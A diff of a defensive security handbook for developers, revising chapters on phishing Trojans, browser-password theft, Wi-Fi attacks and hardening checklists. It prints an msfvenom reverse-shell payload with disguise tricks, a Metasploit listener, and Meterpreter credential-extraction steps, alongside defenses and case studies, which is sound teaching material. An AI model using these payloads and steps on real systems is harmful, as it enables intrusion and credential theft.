+> **Security is only as strong as the weakest layer.** Sally hashed passwords _and_ used 2FA — but a single weak point (storing secrets reachably) undid both.
+
+**Real-world case study — SIM swaps & 2FA-bypass takeovers.** The FBI reported over 1,600 SIM-swap complaints in 2021 with losses exceeding $68M. In a 2019 incident, attackers reportedly bypassed an exchange's 2FA by combining long-term credential collection with look-alike (Unicode) domains to capture OTPs in real time. **Lesson:** 2FA dramatically reduces risk but isn't a finish line. Move high-value accounts to passkeys/FIDO2, avoid SMS, store seeds encrypted. Never type an OTP into a page you reached from an email link.
 
 ---
 
-## 7. Phishing, Trojans & Reverse Shells
+## Chapter 7 — Phishing, Trojans & Reverse Shells
 
-Not every attack targets your code. The most reliable path in is often the person using the machine.
+The most reliable path into a machine is often the person using it. This is **social engineering** — alongside RDP, one of the top two initial attack vectors worldwide.
 
-### The attack — a malicious file disguised as harmless
+### The tools — Metasploit & msfvenom
 
-Kim builds a **reverse shell** with `msfvenom` (part of Metasploit). A reverse shell reaches _back out_ from the victim to the attacker, slipping past firewalls that block inbound but allow outbound:
+**Metasploit** is an end-to-end attack platform; **Meterpreter** is its powerful in-memory remote-control payload. **msfvenom** crafts custom payloads and disguises them as files.
+
+```bash
+# Preinstalled on Kali. Launch: msfconsole
+# Debian/Ubuntu — official installer:
+curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
+chmod +x msfinstall && sudo ./msfinstall
+msfvenom --help
+```
+
+### The Attack — a malicious file disguised as something harmless
+
+A **reverse shell** reaches _back out_ from the victim's machine to the attacker's — because firewalls usually allow outbound connections.
 
 ```bash
 msfvenom -p windows/x64/meterpreter/reverse_tcp \
   LHOST=192.168.122.71 LPORT=4444 -f exe -o updater.exe
+# -p = payload | LHOST = attacker IP | LPORT = listen port | -f exe = Windows executable
 ```
 
-He disguises it — renaming to `picture.jpeg.exe` (Windows hides known extensions, so the victim sees `picture.jpeg`), and zipping it to slip past email filters. Then he sets up a listener and sends a convincing email impersonating a trusted contact or "IT support":
+Disguise tricks: **double extension** (`picture.jpeg.exe` — Windows hides known extensions by default, so the victim sees `picture.jpeg`), and **archive wrapping** (zip the exe to slip past email filters).
 
 ```
-msf6> use exploit/multi/handler
-msf6> set payload windows/x64/meterpreter/reverse_tcp
-msf6> set LHOST 192.168.122.71
-msf6> set LPORT 4444
-msf6> exploit
-# [*] Meterpreter session 1 opened   <-- victim clicked
+# Metasploit listener waiting for the callback
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.122.71
+set LPORT 4444
+exploit
+#   [*] Meterpreter session 1 opened   <-- victim clicked
 ```
 
-The moment the victim double-clicks, the tunnel opens and Kim has remote control.
+Then a convincing email impersonating a trusted contact or "IT support." One double-click opens the tunnel.
 
-### Why it works
+### Why It Works
 
-This is **social engineering** — it exploits trust and habit, not bugs. A familiar sender, an urgent pretext, a hidden extension, a default OS setting. No patch fixes human curiosity.
+Social engineering exploits trust, habit, and urgency — not software bugs. A familiar (spoofed) sender, an urgent pretext, a hidden extension, a default OS setting — each lowers the victim's guard.
 
-### The defense
+### The Defense
 
-- **Show file extensions** (turn off "hide known extensions") so `picture.jpeg.exe` reveals itself.
-- **Never open unexpected attachments** — even from people you know; sender names are trivially spoofed. Verify out-of-band.
-- **Run endpoint protection** with real-time scanning, kept updated.
-- **Don't run as administrator** day-to-day — least privilege limits the damage.
-- **Open suspicious files in a sandbox or VM.**
-- **Filter email aggressively** — block executables, inspect inside archives, use SPF/DKIM/DMARC.
-- **Egress filtering** — reverse shells must call out; restrict and monitor outbound connections.
-- **Train people regularly** — simulated phishing measurably cuts click rates.
+- **Show file extensions** (turn off "hide known extensions").
+- **Never open unexpected attachments** — sender names are trivially spoofed; verify out-of-band.
+- **Run EDR/antivirus** with real-time scanning.
+- **Don't run as administrator** day-to-day.
+- **Open suspicious files in a sandbox/VM.**
+- **Filter email aggressively** (block executables, inspect archives, use SPF/DKIM/DMARC).
+- **Egress filtering** to catch the callback.
+- **Train people regularly** — simulated phishing measurably reduces click rates.
 
-> **Case study — "a sunset photo from Bob".** Kim impersonated Sally's friend and attached a "Paris sunset." Hidden extensions made the Trojan look like a JPEG; trust did the rest. The defenses that would have stopped it cost nothing.
+**Real-world case study — the Sony Pictures hack (2014).** It began with **spear phishing** — emails crafted to look like Apple/Google/Facebook messages to harvest credentials and deliver malware. Several employees with broad access were duped. The attackers then spread destructive "wiper" malware, exfiltrated huge volumes of data, and damaged thousands of computers. Aggravating failures: credentials stored in plaintext files literally named "Computer Passwords," and years of unencrypted email. **Lesson:** a single click can lead to total compromise — layer the defenses.
+
+**Real-world case study — phishing as the gateway to bank heists.** The same actor behind Sony later used spear-phishing and custom malware to fraudulently move roughly $81M out of a central bank. **Lesson:** treat every phishing attempt as a potential first link in a serious chain.
 
 ---
 
-## 8. Stealing Saved Browser Passwords
+## Chapter 8 — Stealing Saved Browser Passwords
 
-Once an attacker has a foothold (Section 7), that "save password?" prompt you clicked months ago becomes a treasure chest.
+Once an attacker has a foothold, the "save password?" prompt becomes a treasure chest.
 
-### The attack
+**How browsers store passwords:** not in an impenetrable vault — in an encrypted file on your computer, with the decryption key tied to your OS login. That protects against _another_ user or theft of the file alone. It does _not_ protect against code running as _you_.
 
-When a browser saves a password, it isn't an impenetrable vault — it's an encrypted file _on your computer_, with the key tied to your OS login. Anyone running as you can decrypt it. From his Meterpreter session, Kim confirms he's running as the user, uploads an extraction tool, and pulls saved passwords, cookies, and session tokens in plaintext:
+### The Attack
 
 ```
-meterpreter> getuid
-# Server username: DESKTOP\Sally
-meterpreter> upload extractor.exe C:\Windows\Temp\
-meterpreter> shell
-C:\> extractor.exe --chrome -o sally_data
-# [+] 18 cookies and 2 passwords found
+# From a Meterpreter session
+getuid                                 # Server username: DESKTOP\Sally
+upload extractor.exe C:\Windows\Temp\
+shell
+extractor.exe --chrome -o sally_data
+#   [+] 18 cookies and 2 passwords found
+#   passwords.json — URLs, usernames, and passwords in plain text
 ```
 
-Stolen cookies can even let him hijack active sessions without a password.
+Stolen **session cookies** can hijack active logins _without any password at all_ (the same trick that bypasses 2FA). On corporate Windows networks, tools like **Mimikatz** dump credentials and hashes from memory for lateral movement.
 
-### Why it works
+### Why It Works
 
-Browser stores protect against _other users_ and _theft of the file alone_ — not against code running as _you_. The key sits right there, bound to your session.
+Browser stores protect against other users and file theft, not against code running as you. Once an attacker has your privileges, the encryption is a formality.
 
-### The defense
+### The Defense
 
 - **Use a dedicated password manager** with a strong master password the OS doesn't hold.
-- **Be cautious with browser-saved passwords** for high-value accounts (banking, email, work).
-- **Prevent the foothold** — everything that stops the Trojan stops this too.
-- **Enable MFA everywhere** so a stolen password is less useful.
-- **Full-disk encryption and a strong OS login.**
-- **Rotate credentials and invalidate sessions** after any suspected compromise.
+- **Be cautious with browser-saved passwords** for high-value accounts.
+- **Prevent the foothold (Ch.7)** — this attack requires the attacker already be on your machine.
+- **Enable MFA everywhere** and shorten session lifetimes.
+- **Use full-disk encryption and a strong OS login.**
+- **Rotate credentials after any suspected compromise** and invalidate sessions server-side.
+- **On corporate networks, deploy EDR and limit admin rights** to make Mimikatz harder.
 
-> **The uncomfortable truth:** "save password" is a convenience that trades away safety the moment your machine is compromised.
+> **The uncomfortable truth:** "save password" is not a vault — it's a convenience that trades away safety the moment your machine is compromised.
 
----
-
-## 9. Network & Wi-Fi Attacks
-
-Shared networks — cafés, airports, hotels, offices — are hunting grounds. Here the attacker gets _between_ you and everything you talk to.
-
-**Packet sniffing.** With a card in **monitor mode** and **Wireshark**, an attacker captures every packet silently. On **HTTP** sites, passwords are plaintext; **HTTPS** hides contents but not metadata (which sites, what times).
-
-**Man-in-the-Middle & SSL stripping.** The attacker relays your traffic through their machine. **SSL stripping** forces your browser down to unencrypted HTTP while keeping a secure link to the real site — page loads normally, no warning, everything you type goes to them.
-
-**Evil Twin.** A cloned Wi-Fi network with the same name and a stronger signal. Your device auto-connects to the stronger one; the attacker then serves fake login pages.
-
-**ARP poisoning.** ARP has **zero authentication** — any device can answer any request. Forged ARP replies claim the attacker's MAC owns the router's IP, routing all your traffic through them. (Detection tip: two IPs sharing one MAC.)
-
-**DNS hijacking.** Compromise the router/DNS (often via default passwords or malware) and answer with a _fake_ IP. Your browser loads a perfect clone of your bank; credentials go to the attacker, who forwards you to the real site so you never suspect.
-
-**DDoS.** A **botnet** of compromised devices (often insecure IoT) floods a target until it collapses and real users are locked out.
-
-### The defense
-
-**For users:**
-
-- **Use a reputable VPN** on public Wi-Fi.
-- **Insist on HTTPS;** never enter credentials on HTTP, never click through certificate warnings.
-- **Turn off auto-connect** to open networks; forget untrusted ones.
-- **Patch devices and routers;** change default router passwords.
-
-**For developers/operators:**
-
-- **Enforce HTTPS everywhere and enable HSTS** (defeats SSL stripping).
-- **Modern TLS only;** consider certificate pinning for sensitive apps.
-- **Dynamic ARP inspection and port security** on managed switches.
-- **DNSSEC and trusted resolvers;** monitor for unexpected DNS changes.
-- **DDoS mitigation / scrubbing** (CDN/WAF) in front of public services.
-- **Secure every IoT device** — default credentials are what build the botnets used against everyone.
-
-> **Case study — a famous botnet.** In 2016, a botnet built from compromised IoT devices flooded major DNS infrastructure and knocked well-known platforms offline. The devices were ordinary cameras and routers left on default passwords. Securing your own IoT is a civic duty as much as a personal one.
+**Real-world case study — credential dumping in ransomware intrusions.** In documented investigations, after gaining access (often via RDP brute force), attackers used **Mimikatz** to dump hashes, scanned for plaintext credentials, created backdoors, and moved laterally before deploying ransomware. **Lesson:** assume any compromised machine will be mined for every credential it holds.
 
 ---
 
-## 10. The Attacker's Toolbox — and What Defends Against Each
+## Chapter 9 — Network & Wi-Fi Attacks
 
-| Tool                    | Category        | What it does                                                                       | What defends against it                                             |
-| ----------------------- | --------------- | ---------------------------------------------------------------------------------- | ------------------------------------------------------------------- |
-| **Nmap**                | Recon/scanning  | Discovers hosts/ports, fingerprints services; ARP locally, ICMP/TCP across routers | Minimize open ports, segment, hide versions, IDS/IPS, patch         |
-| **Gobuster**            | Web discovery   | Brute-forces hidden directories/files                                              | Authenticate paths, rate-limit, IP allow-list, WAF                  |
-| **SecLists**            | Wordlists       | Common usernames/passwords/paths/payloads from breaches                            | Ban breached passwords, strong-password policy, non-guessable paths |
-| **Hydra**               | Login cracker   | Online brute force vs. forms, RDP, SSH, FTP                                        | Lockout, rate limit, MFA, CAPTCHA, generic errors, VPN-gate RDP/SSH |
-| **Burp Suite**          | Web proxy       | Intercept/modify/replay HTTP(S); find & exploit SQLi                               | Parameterized queries, validation, hide errors, WAF                 |
-| **sqlmap**              | SQL injection   | Automates finding/exploiting SQLi, dumps tables                                    | Parameterized queries, least-privilege DB, WAF                      |
-| **John the Ripper**     | Cracking        | Offline dictionary hash cracking                                                   | bcrypt/scrypt/Argon2, unique salts, high work factor                |
-| **Hashcat**             | Cracking        | GPU hash cracking vs. huge lists                                                   | Slow salted hashing, strong unique passwords, pepper                |
-| **msfvenom**            | Payloads        | Crafts/disguises reverse shells                                                    | Don't open attachments, show extensions, EDR, least privilege       |
-| **Metasploit**          | Exploitation    | Exploits, listeners, post-exploitation (Meterpreter)                               | Patch CVEs, EDR, segmentation, egress filtering                     |
-| **Wireshark**           | Packet analysis | Captures/inspects traffic; reads plaintext protocols                               | Encrypt everything (HTTPS/TLS/VPN), HSTS, avoid plaintext           |
-| **Aircrack-ng**         | Wi-Fi           | Captures handshakes, cracks weak Wi-Fi keys                                        | Strong WPA2/WPA3, disable WPS, enterprise auth                      |
-| **xfreerdp**            | RDP client      | Full remote control once creds are known                                           | VPN-gate RDP, MFA, strong passwords, lockout, IP restriction        |
-| **Social-Eng. Toolkit** | Phishing        | Builds phishing pages/cloned logins                                                | Training, MFA, SPF/DKIM/DMARC, URL vigilance                        |
-| **hping3**              | Flooding        | High-speed packet floods (DoS)                                                     | DDoS scrubbing/CDN, rate limiting, upstream filtering               |
+Shared networks are hunting grounds. Here the attacker gets _between_ you and everything you talk to.
 
-These tools aren't secret — they're free and run on a laptop. Your advantage isn't keeping them away; it's building systems where, even with every tool in hand, the attacker finds no door that opens.
+### The tools
+
+**Wireshark** captures and inspects packets; **Aircrack-ng** assesses Wi-Fi security.
+
+```bash
+sudo apt update
+sudo apt install wireshark aircrack-ng dsniff ettercap-graphical -y
+sudo apt install hping3 -y   # DoS demos
+```
+
+### The attacks
+
+- **Packet sniffing:** in monitor mode, an attacker captures every packet in the room. On plain **HTTP**, passwords are readable; **HTTPS** hides contents but leaks metadata (which sites, when).
+- **Man-in-the-Middle (MITM) & SSL stripping:** traffic flows through the attacker; SSL stripping forces your browser down to unencrypted HTTP while the attacker keeps a secure link to the real site — no warning shown.
+- **Evil Twin:** a fake Wi-Fi cloning a trusted name with a stronger signal; your device auto-connects to the attacker.
+- **ARP poisoning:** ARP has zero authentication; forged replies make your machine route all traffic through the attacker. _(Detection tip: two IPs sharing one MAC = likely poisoning.)_
+- **DNS hijacking:** compromise the router/DNS (often via default passwords) to answer lookups with fake IPs — a perfect clone of your bank harvests your login.
+- **DDoS:** a **botnet** of compromised devices (increasingly insecure IoT) floods a target to take it offline.
+
+### The Defense
+
+**For users on shared networks:** use a reputable **VPN**; insist on **HTTPS** (never click through certificate warnings); turn off **auto-connect**; keep devices and routers patched, change default router passwords.
+
+**For developers/operators:** enforce **HTTPS + HSTS** (defeats SSL stripping); use modern TLS; protect against ARP spoofing (dynamic ARP inspection, port security); use **DNSSEC** and trusted resolvers; put **DDoS mitigation/CDN** in front of public services; **secure every IoT device** (change defaults, patch firmware, disable UPnP/Telnet).
+
+**Real-world case study — the Mirai botnet & the Dyn DDoS (2016).** Mirai scanned for open Telnet ports and tried ~62 common default credentials (root/root, admin/admin, root/123456). Each device it logged into — cameras, DVRs, routers — joined a botnet. On Oct 21, 2016 it launched a ~1.2 Tbps DDoS against **Dyn**, a major DNS provider, knocking Twitter, Netflix, Reddit and others offline across North America and Europe. **Lesson:** the devices weren't exotic — just gadgets left on factory passwords. Securing your IoT protects the wider internet.
+
+**Real-world case study — the Krebs and OVH attacks.** Before Dyn, the same Mirai botnet hit journalist Brian Krebs's site with over 600 Gbps and then the OVH hosting company with an even larger flood; publishing the source code spawned copycats. **Lesson:** DDoS scrubbing/CDN is essential for any service that matters, and every insecure device is potential ammunition against someone else.
 
 ---
 
-## 11. The Developer's Hardening Checklist
+## Capstone — Anatomy of a Full Attack Chain
+
+Real breaches are _chains_ — each step enabling the next. Against Sally's small e-commerce business (2FA and hashing, but fast unsalted hashes, secrets in the DB, RDP enabled, browser-saved passwords), an authorized tester walks the whole path:
+
+1. **Recon (Ch.1):** resolve domain, `nmap -sV`, find web + RDP open. _Break point: close RDP to the internet._
+2. **Discovery (Ch.2):** Gobuster finds `/admin.php`. _Break point: IP-allow-list / VPN the panel._
+3. **Initial access via SQLi (Ch.4):** UNION SELECT dumps the users table. _Break point: parameterized queries — the single most chain-breaking fix._
+4. **Cracking (Ch.5):** unsalted MD5 falls in seconds. _Break point: salted Argon2._
+5. **Defeating 2FA (Ch.6):** TOTP seeds were in the same table, plaintext. _Break point: encrypt seeds / use passkeys._
+6. **Compromising the workstation (Ch.7):** disguised Trojan → Meterpreter. _Break point: show extensions, EDR, no admin, don't open it._
+7. **Harvesting credentials (Ch.8):** browser passwords, cookies, Mimikatz. _Break point: password manager, limited admin._
+8. **Lateral movement & impact (Ch.3, 9):** harvested creds + open RDP reach the crown jewels. _Break point: segmentation, internal MFA, offline backups._
+
+**The lesson: you only have to break the chain once.** The attacker needs _every_ step to succeed; the defender needs to win _any one_. That asymmetry is the whole argument for defense in depth.
+
+**Real-world case study — chains in practice.** Incident reports repeatedly show the same arc: exposed service or phished user → credential dumping → lateral movement → payload (ransomware/data theft). Sony began with phishing and ended in total compromise; many ransomware cases began with RDP brute force and ended with domain-wide encryption. **Lesson:** audit the whole path from "outside attacker" to "worst-case impact," and ensure a working defense at several links.
+
+---
+
+## The Attacker's Toolbox — Reference
+
+| Tool                | Category           | What it does                          | Install (Debian/Ubuntu)                 | What defends against it                               |
+| ------------------- | ------------------ | ------------------------------------- | --------------------------------------- | ----------------------------------------------------- |
+| **Nmap**            | Recon/scanning     | Finds hosts, ports, service versions  | `apt install nmap`                      | Minimize ports, segment, hide banners, IDS/IPS, patch |
+| **Gobuster**        | Web discovery      | Brute-forces hidden directories/files | `apt install gobuster`                  | Authenticate paths, rate-limit, allow-list, WAF       |
+| **SecLists**        | Wordlists          | Curated usernames/passwords/paths     | `apt install seclists`                  | Ban breached/common passwords, non-guessable paths    |
+| **Hydra**           | Login cracker      | Online brute force (forms, RDP, SSH)  | `apt install hydra`                     | Lockout, rate limit, MFA, CAPTCHA, VPN-gate RDP/SSH   |
+| **Burp Suite**      | Web proxy          | Intercept/modify/replay HTTP(S)       | Kali / portswigger.net                  | Parameterized queries, validation, hide errors, WAF   |
+| **sqlmap**          | SQL injection      | Automates SQLi detection & dumping    | `apt install sqlmap`                    | Parameterized queries, least-privilege DB, WAF        |
+| **John the Ripper** | Cracking           | Offline dictionary/rule cracking      | `apt install john`                      | bcrypt/scrypt/Argon2, unique salts, high cost         |
+| **Hashcat**         | Cracking           | GPU-accelerated cracking              | `apt install hashcat`                   | Slow salted hashing, strong passwords, pepper         |
+| **msfvenom**        | Payloads           | Crafts & disguises payloads           | With Metasploit                         | Don't open attachments, show extensions, EDR          |
+| **Metasploit**      | Exploitation       | Exploits, listeners, Meterpreter      | msfinstall script                       | Patch CVEs, EDR, segmentation, egress filtering       |
+| **Wireshark**       | Packet analysis    | Captures & inspects traffic           | `apt install wireshark`                 | Encrypt everything (HTTPS/TLS/VPN), HSTS              |
+| **Aircrack-ng**     | Wi-Fi cracking     | Captures handshakes, cracks weak keys | `apt install aircrack-ng`               | Strong WPA2/WPA3, disable WPS, 802.1X                 |
+| **Ettercap/dsniff** | MITM/ARP           | ARP poisoning & interception          | `apt install ettercap-graphical dsniff` | Dynamic ARP inspection, HTTPS+HSTS, VPN               |
+| **xfreerdp**        | RDP client         | Remote control once creds known       | `apt install freerdp2-x11`              | VPN-gate RDP, MFA, lockout, restrict by IP            |
+| **hping3**          | Flooding/DoS       | High-speed crafted packets            | `apt install hping3`                    | DDoS scrubbing/CDN, rate limiting, upstream filtering |
+| **Mimikatz**        | Credential dumping | Extracts Windows creds from memory    | Windows post-exploitation               | Limit admin, EDR, Credential Guard, segmentation      |
+
+### Mapping to the OWASP Top 10
+
+Injection → Ch.4 (parameterized queries) · Auth Failures → Ch.3, 6 (lockout, MFA) · Cryptographic Failures → Ch.5, 9 (salted hashing, TLS/HSTS) · Broken Access Control → Ch.2 (authenticate every path) · Security Misconfiguration → Ch.1, 2, 9 (minimize exposure, change defaults) · Vulnerable Components → Ch.1, 4 (patch, track dependencies) · Logging/Monitoring Failures → Ch.1, 3 (log, alert, review) · Human layer → Ch.7, 8 (training, MFA, least privilege).
+
+---
+
+## The Developer's Hardening Checklist
 
 ### Tier 1 — Do these first (highest impact, lowest effort)
 
-- [ ] **Parameterized queries / prepared statements** for every DB call. No string-concatenated SQL anywhere.
-- [ ] **Account lockout and rate limiting** on all login endpoints.
-- [ ] **One generic auth error** ("invalid username or password") — never reveal whether a username exists.
-- [ ] **bcrypt / scrypt / Argon2 with a unique salt** per user. Migrate off MD5/SHA-1.
-- [ ] **Show file extensions** on Windows; train staff never to open unexpected attachments.
-- [ ] **Enforce HTTPS everywhere and enable HSTS.**
+- [ ] Parameterized queries for every database call. _(Ch.4)_
+- [ ] Account lockout and rate limiting on all logins. _(Ch.3)_
+- [ ] A single generic auth-failure message. _(Ch.3)_
+- [ ] bcrypt/scrypt/Argon2 with a unique salt; migrate off MD5/SHA-1. _(Ch.5)_
+- [ ] Turn off "hide known file extensions"; train staff on attachments. _(Ch.7)_
+- [ ] Enforce HTTPS everywhere + HSTS. _(Ch.9)_
+- [ ] Change all default passwords (routers, IoT, DBs, admin consoles). _(Ch.9)_
 
 ### Tier 2 — Strong protections to add next
 
-- [ ] **MFA;** store any TOTP secrets **encrypted or in a vault**, never plaintext.
-- [ ] **Least privilege** for DB accounts, OS accounts, services. Don't work as admin/root.
-- [ ] **Never show raw error messages** to users; log server-side.
-- [ ] **Authenticate every admin/sensitive endpoint** — assume the URL is public.
-- [ ] **Close unused ports;** VPN-gate RDP/SSH, use SSH keys, disable password login.
-- [ ] **Block known-breached/common passwords** at signup and change.
-- [ ] **Endpoint protection** with real-time scanning; patch everything.
+- [ ] MFA (prefer passkeys/FIDO2 over SMS); store TOTP secrets encrypted/in a vault. _(Ch.6)_
+- [ ] Least privilege for DB/OS accounts; don't run as admin. _(Ch.4, 7, 8)_
+- [ ] Never show raw error messages; log them server-side. _(Ch.4)_
+- [ ] Authenticate every admin/sensitive endpoint. _(Ch.2)_
+- [ ] Close unused ports; VPN-gate RDP/SSH; SSH keys only. _(Ch.1, 3)_
+- [ ] Block known-breached/common passwords. _(Ch.3, 5)_
+- [ ] Run EDR with real-time scanning; patch everything. _(Ch.7, 8)_
+- [ ] Keep `.git`, backups, configs out of the web root. _(Ch.2)_
 
 ### Tier 3 — Defense in depth & operational maturity
 
-- [ ] **WAF** in front of web apps.
-- [ ] **Network segmentation** (servers / workstations / IoT VLANs).
-- [ ] **Egress filtering** + monitoring to catch reverse shells.
-- [ ] **Dedicated password manager;** limit browser-saved passwords for high-value accounts.
-- [ ] **DDoS mitigation / CDN** in front of public services.
-- [ ] **Secure all IoT and router defaults.**
-- [ ] **Logging and alerting** on auth failures, scans, config changes — reviewed regularly.
-- [ ] **Periodic security testing** (or a pen tester) and **simulated phishing** for staff.
-- [ ] **Incident response plan:** rotate credentials, invalidate sessions, contain a breach.
+- [ ] Deploy a WAF. _(Ch.2, 4)_
+- [ ] Segment the network into VLANs. _(Ch.1, 8)_
+- [ ] Egress filtering; monitor outbound connections. _(Ch.7)_
+- [ ] Dedicated password manager; limit browser-saved passwords. _(Ch.8)_
+- [ ] DDoS mitigation/CDN in front of public services. _(Ch.9)_
+- [ ] Harden against ARP/DNS attacks (dynamic ARP inspection, DNSSEC). _(Ch.9)_
+- [ ] Logging and alerting on auth failures, scans, config changes. _(Ch.1, 3)_
+- [ ] Periodic security testing and simulated phishing. _(Ch.7)_
+- [ ] An incident-response plan. _(All)_
+- [ ] Tested, offline backups. _(Ch.3)_
+
+### If you've already been breached — a first-response checklist
+
+**Contain (first hours):** isolate affected machines; revoke/rotate credentials, keys, tokens; invalidate sessions server-side; reset passwords and force MFA re-auth.
+
+**Assess (first days):** preserve logs and evidence before they rotate; determine entry point and scope; check for persistence (new accounts, scheduled tasks, backdoors); identify regulatory/notification obligations.
+
+**Recover & harden (following weeks):** rebuild from known-good backups; **patch the root cause** before reconnecting; notify affected parties where required; work the Tier-1 → Tier-3 checklist; write a short post-mortem.
+
+> **The most important mindset:** a breach is not a moral failing — it's a systems problem with systems solutions. Move methodically, fix the root cause, and let the incident drive durable improvements.
 
 ---
 
-## Final word
+## A 30 / 60 / 90-Day Action Plan
 
-Every breach here traces back to a small, ordinary, fixable mistake: a hidden page that was only hidden, an input box that trusted its input, a password that was fast to crack, a secret stored next to the data it protected, a person who trusted the wrong email. Attackers are patient and their tools are free — but their entire playbook depends on those small mistakes existing.
+**First 30 days — close the easy doors:** parameterize SQL; add lockout + rate limiting + generic errors; change default passwords; enforce HTTPS+HSTS; take RDP/SSH off the internet; show file extensions.
 
-Defense isn't about being unbreakable. It's about closing the easy doors so thoroughly that an attacker moves on. Fix the Tier-1 items today, work down the list, and you'll have shut the most common paths used against developers like Sally — and like you.
+**Days 30–60 — strengthen identity & data:** migrate to salted Argon2/bcrypt and block breached passwords; roll out MFA and vault TOTP seeds; apply least privilege; move secrets out of source/DB; relocate `.git`/backups/configs; deploy EDR and automatic patching.
 
-**Stay curious. Stay ethical. Build the wall.**
+**Days 60–90 — depth, detection & drills:** add WAF + DDoS scrubbing/CDN; segment into VLANs + egress filtering; turn on logging/alerting and review weekly; run a self-pentest and fix findings; set up offline backups and an IR plan; run a simulated phishing exercise and team training.
+
+At the end of 90 days you'll have a credible defense at every link of the attack chain. Then repeat the cycle: security is a practice, not a project.
+
+---
+
+## Secure Coding Patterns — Before & After
+
+**1. SQL injection → parameterized queries**
+
+```python
+# Vulnerable
+query = "SELECT * FROM users WHERE name = '" + name + "'"
+cursor.execute(query)
+
+# Fixed — the ? placeholder can never become SQL code
+cursor.execute("SELECT * FROM users WHERE name = ?", (name,))
+# PHP (PDO): $stmt = $pdo->prepare("... WHERE name = ?"); $stmt->execute([$name]);
+# Node (pg): client.query("... WHERE name = $1", [name])
+```
+
+**2. Fast/unsalted hashing → slow salted hashing**
+
+```python
+# Vulnerable: hash = md5(password)
+# Fixed:
+import bcrypt
+hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt())
+bcrypt.checkpw(attempt.encode(), hashed)
+# Even better: Argon2id via argon2-cffi
+```
+
+**3. Leaky auth errors → generic responses**
+
+```python
+# Vulnerable: "No account with that username" / "Incorrect password"
+# Fixed: if not user or not match: return "Invalid username or password"
+```
+
+**4. Open login → lockout & rate limiting**
+
+```text
+fails = get_recent_failures(username, ip)
+if fails >= 5: require_captcha_or_lock(window="15 min")
+# Track per-account AND per-IP; add exponential backoff; alert on spikes.
+```
+
+**5. Secrets in code/DB → environment & vaults**
+
+```python
+# Vulnerable: API_KEY = "sk_live_abc123..."  (leaks via .git, backups, DB dumps)
+# Fixed:
+import os
+API_KEY = os.environ["API_KEY"]
+# Production: pull from a vault/KMS. Encrypt TOTP seeds at rest.
+```
+
+**6. HTTP / weak transport → HTTPS + HSTS**
+
+```text
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+# Redirect all HTTP -> HTTPS at the edge; disable old TLS versions/ciphers.
+```
+
+> **The unifying principle:** never trust input, never mix secrets with data, never reveal more than necessary, and make the expensive-for-attackers path the default.
+
+---
+
+## Where to Practice (Legally) & Keep Learning
+
+**Deliberately vulnerable apps:** OWASP Juice Shop, DVWA, Metasploitable, WebGoat.
+
+**Online ranges & challenges:** TryHackMe, Hack The Box, PortSwigger Web Security Academy.
+
+**Reference & staying current:** OWASP (Top 10, cheat sheets), MITRE ATT&CK, Have I Been Pwned, CISA & national CERT advisories, vendor incident-response reports.
+
+**A healthy practice loop:** learn a technique in a guided lab → reproduce it against your own vulnerable VM → **fix it** and confirm the attack no longer works → run the same tool against your _real_ systems (in scope) to verify you're not exposed.
+
+---
+
+## Appendix — a compendium of notable breaches
+
+| Breach            | Year    | Technique               | Core failure                               |
+| ----------------- | ------- | ----------------------- | ------------------------------------------ |
+| Heartland         | 2008    | SQL injection           | Unparameterized queries; ~130M cards       |
+| Sony PSN          | 2011    | SQLi / weak controls    | No firewalls in places; ~77M accounts      |
+| Yahoo! Voices     | 2012    | Union-based SQLi        | ~450K passwords unencrypted                |
+| LinkedIn          | 2012    | Hash cracking           | Unsalted SHA-1; 117M+ by 2016              |
+| Sony Pictures     | 2014    | Spear phishing          | Credential theft; plaintext password files |
+| TalkTalk          | 2015    | SQL injection           | Unpatched SQLi; ~157K customers            |
+| Mirai / Dyn       | 2016    | IoT botnet DDoS         | Default device passwords; ~1.2 Tbps        |
+| Equifax           | 2017    | Unpatched web vuln      | Known flaw left unpatched; ~143M people    |
+| SamSam            | 2018    | RDP brute force         | Exposed RDP, weak credentials, no lockout  |
+| Marriott/Starwood | 2014–18 | Mixed (incl. injection) | 4 years undetected; ~500M guests           |
+| Binance           | 2019    | Phishing + 2FA bypass   | Look-alike domains captured OTPs           |
+| Kaseya VSA        | 2021    | Unpatched SQLi-class    | Supply-chain ransomware; 1,500+ clients    |
+
+**The pattern across every entry:** almost none were unstoppable zero-days. They were unparameterized queries, unpatched flaws, weak or default passwords, plaintext secrets, missing MFA, absent monitoring, and untrained users — the exact issues this handbook addresses. The giants fell to the same mistakes that threaten the smallest startup. The encouraging part: the fixes are known, documented, and within your reach.
+
+---
+
+_Stay curious. Stay ethical. Build the wall._
 
 ---
 
@@ -497,5 +764,7 @@ I run paid engagements walking teams through this exact checklist — Tier 1 aud
 - **Nmap**: [nmap.org](https://nmap.org)
 - **Burp Suite**: [portswigger.net/burp](https://portswigger.net/burp)
 - **Metasploit**: [metasploit.com](https://metasploit.com)
+- **MITRE ATT&CK**: [attack.mitre.org](https://attack.mitre.org)
+- **PortSwigger Web Security Academy**: [portswigger.net/web-security](https://portswigger.net/web-security)
 - **Argon2 reference**: [github.com/P-H-C/phc-winner-argon2](https://github.com/P-H-C/phc-winner-argon2)
 - **Sentinel (JB's Go security SDK)**: [github.com/MUKE-coder/sentinel](https://github.com/MUKE-coder/sentinel)
